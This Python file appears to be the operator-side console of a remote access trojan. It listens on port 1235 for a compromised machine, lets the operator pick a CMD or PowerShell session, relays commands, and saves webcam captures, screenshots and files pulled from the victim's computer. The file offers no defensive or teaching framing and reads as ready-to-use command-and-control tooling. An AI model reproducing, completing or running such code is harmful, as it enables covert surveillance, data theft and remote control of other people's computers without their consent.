import socket
import sys

 
def connect():
   host="" 
   port=1235
   s=socket.socket()
   s.bind((host,port))
   print(f"Binding On Port {port}")
   s.listen(1)
   conn,address=s.accept()
   print(f"The Connection has Been Established with {address[0]} {address[1]}")
   return (conn,s)


def choice(conn):
   choice=input(" CMD OR PS = ")
   conn.sendall(str.encode(choice,"utf-8"))
   

def webcam_pic(conn,cmd):
    filename = str(cmd[7:])+".png"
    with open(filename,"wb") as file:
       data = conn.recv(1024)
       file.write(data)
       while not ("Sended" in str(data)):
           data=conn.recv(1024)
           file.write(data)
       file.close()
    print(f"WebCam Captured as : {filename}")
    
def ss(conn,cmd):
    filename = str(cmd[3:])+".png"
    with open(filename,"wb") as file:
        data=conn.recv(1024)
        file.write(data)
        while not ("Sended" in str(data)):
            data=conn.recv(1024)
            file.write(data)
        file.close()
        print(f"Screenshot Captured as : {filename}")

def download(conn,cmd):
    filename=cmd[9:]
    conn.send(str(filename).encode("utf-8"))
    with open(filename,"wb") as file:
        data=conn.recv(1024)
        file.write(data)
    print(f"File saved as : {filename}")


def main():
   conn,s=connect()
   choice(conn)
   while True:
       try:
          cmd=input("")
          if(cmd=='exit'):
              conn.close()
              s.close()
              sys.exit()
          elif len(str.encode(cmd,"utf-8")) >= 0:
                 conn.send(str.encode(cmd,"utf-8"))
                 if(cmd[:6]=="webcam"):
                    webcam_pic(conn,cmd)
                    continue
                       
                 elif(cmd[:2])=="ss": 
                     ss(conn,cmd)
                     continue
               
                 elif(cmd[:8]=="download"):
                     download(conn,cmd)
                     continue
                        
                 else:
                     client_response=str(conn.recv(32000),"utf-8")
                     print(client_response,end="")
       except KeyboardInterrupt:
           conn.close()
           s.close()
           sys.exit()
           
main()
